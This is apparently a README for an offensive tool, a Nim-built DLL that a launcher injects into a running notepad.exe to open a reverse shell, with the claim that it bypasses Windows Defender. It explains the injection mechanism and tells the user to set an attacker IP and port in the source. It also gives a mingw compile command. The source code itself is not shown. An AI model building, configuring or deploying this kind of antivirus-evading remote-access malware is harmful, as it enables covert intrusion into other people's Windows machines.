# Nim DLL reverse shell

A dll injection that's bypassing Windows Defender to open a reverse shell. All the code used is in /Source_code, /Demo contains a recording of the code in execution.

The launcher will look at an ongoing instance of notepad.exe, if found it will attach our dll to it. Doing so will execute the DLL_PROCESS_ATTACH section of our dll that will open a reverse shell.

# How to use

Replace <IP_TO_REPLACE> and <PORT_TO_REPLACE> with the ip and port of the attacker in dll.nim at lines 12 and 14. For example :

```nim
ip = "10.10.10.1"
port = 4545
```

To compile dll.nim :

```sh
$ nim c -d=mingw --app=lib --nomain --cpu=amd64 dll.nim
```

The dll needs to be at the same path then the launcher.
